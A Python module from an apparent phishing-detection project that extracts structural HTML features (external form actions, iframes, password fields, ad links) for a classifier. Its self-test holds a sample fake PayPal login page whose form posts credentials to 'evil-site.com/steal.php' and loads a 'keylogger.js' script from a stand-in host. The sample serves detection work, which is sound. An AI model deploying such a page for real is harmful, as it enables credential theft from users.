"""
PhishGuard++ — HTML Feature Extraction
Extracts 20 structural features from raw HTML content for the Tier 2 classifier.

Features:
  1.  form_action_external    — 1 if any <form> action points externally
  2.  iframe_count            — Number of <iframe> tags
  3.  hidden_input_count      — Number of <input type="hidden">
  4.  external_link_ratio     — Fraction of <a> href pointing externally
  5.  script_count            — Number of <script> tags
  6.  meta_refresh_present    — 1 if <meta http-equiv="refresh"> exists
  7.  login_form_present      — 1 if a form has password-type input
  8.  password_field_count    — Number of password inputs
  9.  title_domain_mismatch   — 1 if <title> text doesn't mention the origin domain
  10. favicon_external        — 1 if favicon points to external domain
  11. anchor_to_javascript    — Count of <a href="javascript:...">
  12. copyright_year_present  — 1 if a copyright notice with a year exists
  13. social_media_links_count—Number of links to known social media
  14. page_size_bytes         — Total size of HTML in bytes
  15. whitespace_ratio        — Fraction of whitespace in HTML
  16. noscript_count          — Number of <noscript> tags
  17. internal_link_count     — Number of links pointing to same domain
  18. image_count             — Number of <img> tags
  19. ad_network_links        — Count of links to known ad/tracking networks
  20. contact_page_link       — 1 if any link text/href contains "contact"
"""

import re
import logging
from typing import Dict, Optional
from urllib.parse import urlparse

import pandas as pd
from bs4 import BeautifulSoup
from pathlib import Path

logger = logging.getLogger(__name__)

# ── Constants ──────────────────────────────────────────────────
SOCIAL_MEDIA_DOMAINS = [
    "facebook.com", "twitter.com", "x.com", "instagram.com",
    "linkedin.com", "youtube.com", "tiktok.com", "pinterest.com",
    "reddit.com", "tumblr.com",
]

AD_NETWORK_DOMAINS = [
    "doubleclick.net", "googlesyndication.com", "googleadservices.com",
    "google-analytics.com", "analytics.google.com",
    "facebook.net", "fbcdn.net", "adnxs.com", "adsrvr.org",
    "criteo.com", "taboola.com", "outbrain.com",
]


def _get_domain(url: str) -> str:
    """Extract domain from URL."""
    try:
        parsed = urlparse(url if "://" in url else f"https://{url}")
        return parsed.netloc.lower().split(":")[0]
    except Exception:
        return ""


def _is_external(href: str, origin_domain: str) -> bool:
    """Check if a link href points to an external domain."""
    if not href:
        return False
    href = href.strip().lower()
    # Relative links are internal
    if href.startswith("/") or href.startswith("#") or href.startswith("?"):
        return False
    if href.startswith("javascript:") or href.startswith("mailto:"):
        return False
    link_domain = _get_domain(href)
    if not link_domain:
        return False
    return origin_domain not in link_domain and link_domain not in origin_domain


def extract_html_features(
    html_content: str,
    origin_url: Optional[str] = None,
) -> Dict[str, float]:
    """
    Extract 20 structural features from raw HTML.

    Args:
        html_content: Raw HTML string
        origin_url: The URL this HTML was fetched from (for internal/external checks)

    Returns:
        Dictionary of 20 feature values
    """
    features = {}

    origin_domain = _get_domain(origin_url) if origin_url else ""

    try:
        soup = BeautifulSoup(html_content, "lxml")
    except Exception:
        try:
            soup = BeautifulSoup(html_content, "html.parser")
        except Exception:
            return {name: 0.0 for name in HTML_FEATURE_NAMES}

    # ── 1. form_action_external ──
    forms = soup.find_all("form")
    form_action_external = 0
    for form in forms:
        action = form.get("action", "")
        if action and _is_external(action, origin_domain):
            form_action_external = 1
            break
    features["form_action_external"] = form_action_external

    # ── 2. iframe_count ──
    features["iframe_count"] = len(soup.find_all("iframe"))

    # ── 3. hidden_input_count ──
    features["hidden_input_count"] = len(
        soup.find_all("input", attrs={"type": "hidden"})
    )

    # ── 4. external_link_ratio ──
    all_links = soup.find_all("a", href=True)
    if all_links:
        external_count = sum(1 for a in all_links if _is_external(a["href"], origin_domain))
        features["external_link_ratio"] = external_count / len(all_links)
    else:
        features["external_link_ratio"] = 0.0

    # ── 5. script_count ──
    features["script_count"] = len(soup.find_all("script"))

    # ── 6. meta_refresh_present ──
    meta_refresh = soup.find("meta", attrs={"http-equiv": re.compile(r"refresh", re.I)})
    features["meta_refresh_present"] = int(meta_refresh is not None)

    # ── 7. login_form_present ──
    password_inputs = soup.find_all("input", attrs={"type": "password"})
    features["login_form_present"] = int(len(password_inputs) > 0)

    # ── 8. password_field_count ──
    features["password_field_count"] = len(password_inputs)

    # ── 9. title_domain_mismatch ──
    title_tag = soup.find("title")
    if title_tag and title_tag.string and origin_domain:
        title_text = title_tag.string.lower()
        # Check if the main domain (without TLD) appears in title
        domain_core = origin_domain.split(".")[0] if "." in origin_domain else origin_domain
        features["title_domain_mismatch"] = int(domain_core not in title_text)
    else:
        features["title_domain_mismatch"] = 0

    # ── 10. favicon_external ──
    favicon = soup.find("link", rel=re.compile(r"icon", re.I))
    if favicon and favicon.get("href"):
        features["favicon_external"] = int(_is_external(favicon["href"], origin_domain))
    else:
        features["favicon_external"] = 0

    # ── 11. anchor_to_javascript ──
    js_anchors = soup.find_all("a", href=re.compile(r"^javascript:", re.I))
    features["anchor_to_javascript"] = len(js_anchors)

    # ── 12. copyright_year_present ──
    text_content = soup.get_text()
    features["copyright_year_present"] = int(
        bool(re.search(r"(?:©|\bcopyright\b)\s*\d{4}", text_content, re.I))
    )

    # ── 13. social_media_links_count ──
    social_count = 0
    for a in all_links:
        href = a.get("href", "").lower()
        if any(sm in href for sm in SOCIAL_MEDIA_DOMAINS):
            social_count += 1
    features["social_media_links_count"] = social_count

    # ── 14. page_size_bytes ──
    features["page_size_bytes"] = len(html_content.encode("utf-8", errors="ignore"))

    # ── 15. whitespace_ratio ──
    if html_content:
        ws = sum(1 for c in html_content if c.isspace())
        features["whitespace_ratio"] = ws / len(html_content)
    else:
        features["whitespace_ratio"] = 0.0

    # ── 16. noscript_count ──
    features["noscript_count"] = len(soup.find_all("noscript"))

    # ── 17. internal_link_count ──
    if all_links:
        features["internal_link_count"] = sum(
            1 for a in all_links if not _is_external(a["href"], origin_domain)
        )
    else:
        features["internal_link_count"] = 0

    # ── 18. image_count ──
    features["image_count"] = len(soup.find_all("img"))

    # ── 19. ad_network_links ──
    ad_count = 0
    for tag in soup.find_all(["script", "iframe", "a", "img"], src=True):
        src = tag.get("src", "").lower()
        if any(ad in src for ad in AD_NETWORK_DOMAINS):
            ad_count += 1
    for a in all_links:
        href = a.get("href", "").lower()
        if any(ad in href for ad in AD_NETWORK_DOMAINS):
            ad_count += 1
    features["ad_network_links"] = ad_count

    # ── 20. contact_page_link ──
    contact_link = 0
    for a in all_links:
        href = a.get("href", "").lower()
        text = a.get_text().lower()
        if "contact" in href or "contact" in text:
            contact_link = 1
            break
    features["contact_page_link"] = contact_link

    return features


# ── Column order for consistency ───────────────────────────────
HTML_FEATURE_NAMES = [
    "form_action_external", "iframe_count", "hidden_input_count",
    "external_link_ratio", "script_count", "meta_refresh_present",
    "login_form_present", "password_field_count", "title_domain_mismatch",
    "favicon_external", "anchor_to_javascript", "copyright_year_present",
    "social_media_links_count", "page_size_bytes", "whitespace_ratio",
    "noscript_count", "internal_link_count", "image_count",
    "ad_network_links", "contact_page_link",
]

HUMAN_READABLE_NAMES = {
    "form_action_external": "Form submits data to an external website",
    "iframe_count": "Page embeds hidden frames (iframes)",
    "hidden_input_count": "Page has hidden form fields",
    "external_link_ratio": "Most links point to external sites",
    "script_count": "Page has many scripts running",
    "meta_refresh_present": "Page automatically redirects",
    "login_form_present": "Page has a login form",
    "password_field_count": "Page asks for passwords",
    "title_domain_mismatch": "Page title doesn't match the website's domain",
    "favicon_external": "Website icon (favicon) loads from another site",
    "anchor_to_javascript": "Links execute JavaScript instead of navigating",
    "copyright_year_present": "Page has a copyright notice",
    "social_media_links_count": "Page links to social media",
    "page_size_bytes": "Page is unusually large or small",
    "whitespace_ratio": "Page has unusual whitespace patterns",
    "noscript_count": "Page has noscript fallback elements",
    "internal_link_count": "Page has internal navigation links",
    "image_count": "Number of images on the page",
    "ad_network_links": "Page contains ad/tracking network links",
    "contact_page_link": "Page has a contact link",
}


def extract_html_features_from_file(
    filepath: Path,
    origin_url: Optional[str] = None,
) -> Dict[str, float]:
    """Extract features from an HTML file on disk."""
    try:
        with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
            html_content = f.read()
        return extract_html_features(html_content, origin_url)
    except Exception as e:
        logger.warning(f"Failed to read {filepath}: {e}")
        return {name: 0.0 for name in HTML_FEATURE_NAMES}


def extract_html_features_batch(
    mendeley_df: pd.DataFrame,
    html_dir: Path,
    show_progress: bool = True,
) -> pd.DataFrame:
    """
    Extract HTML features for all Mendeley entries that have HTML files.

    Args:
        mendeley_df: DataFrame with columns 'html_filename', 'url', 'html_exists'
        html_dir: Path to directory containing HTML files
        show_progress: Whether to show tqdm progress bar

    Returns:
        DataFrame with 20 HTML feature columns + 'html_filename' for joining
    """
    from tqdm import tqdm

    available = mendeley_df[mendeley_df["html_exists"] == True].copy()
    logger.info(f"Extracting HTML features from {len(available)} files")

    iterator = tqdm(available.iterrows(), total=len(available),
                    desc="Extracting HTML features") if show_progress else available.iterrows()

    records = []
    filenames = []
    for _, row in iterator:
        filepath = html_dir / row["html_filename"]
        features = extract_html_features_from_file(filepath, row.get("url"))
        features["html_filename"] = row["html_filename"]
        records.append(features)

    result = pd.DataFrame(records)
    return result


def extract_smart_html_excerpt(html_content: str, max_chars: int = 2000) -> str:
    """
    Extract a smart HTML excerpt for CodeBERT / Gemini input.
    Keeps: <head> content (500 chars) + all <form> tags + first 20 <a> tags + <img> tags.
    """
    try:
        soup = BeautifulSoup(html_content, "lxml")
    except Exception:
        soup = BeautifulSoup(html_content, "html.parser")

    parts = []

    # Head content (truncated)
    head = soup.find("head")
    if head:
        parts.append(str(head)[:500])

    # All form elements
    for form in soup.find_all("form"):
        parts.append(str(form))

    # First 20 anchor tags
    for a in soup.find_all("a")[:20]:
        parts.append(str(a))

    # All img tags
    for img in soup.find_all("img"):
        parts.append(str(img))

    excerpt = "\n".join(parts)
    return excerpt[:max_chars]


# ── Quick test ─────────────────────────────────────────────────
if __name__ == "__main__":
    test_html = """
    <html>
    <head><title>PayPal Login</title></head>
    <body>
        <form action="https://evil-site.com/steal.php" method="POST">
            <input type="hidden" name="token" value="abc123">
            <input type="text" name="email" placeholder="Email">
            <input type="password" name="pass" placeholder="Password">
            <button type="submit">Login</button>
        </form>
        <iframe src="https://tracker.com/pixel"></iframe>
        <a href="javascript:void(0)">Click here</a>
        <a href="https://facebook.com/paypal">Follow us</a>
        <script src="https://cdn.evil.com/keylogger.js"></script>
        <script>document.title = "PayPal - Login";</script>
    </body>
    </html>
    """

    features = extract_html_features(test_html, origin_url="https://paypal-login.suspicious.com")
    print("── HTML Feature Extraction Test ──\n")
    for name, val in features.items():
        if val != 0:
            print(f"  {name}: {val}")
